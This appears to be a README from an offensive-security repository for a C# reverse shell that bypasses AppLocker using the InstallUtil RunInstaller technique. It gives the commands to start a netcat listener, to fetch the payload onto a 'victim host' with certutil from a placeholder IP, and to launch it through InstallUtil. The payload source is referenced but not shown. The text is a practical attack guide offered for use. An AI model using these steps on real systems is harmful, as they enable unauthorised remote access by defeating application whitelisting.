# Reverse Shell AppLocker Bypass with basic netcat listener
A .NET installation utility used for registering .NET assemblies can be used and reference the RunInstaller component to trigger the malicious payload that is not found in the 'main' call. 

Compile the csharp binary in Visual Studio and transfer to victim host with certutil. 


## Requirements: 
A netcat listener setup on same ip address and port number as listen in Program.cs on lines 25 and 26

```bash
# setup netcat listener
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 8080

# Download file via certutil -urlcache -f http://ip/CLMBypass-shell.exe shell.exe
PS > C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U shell.exe
```
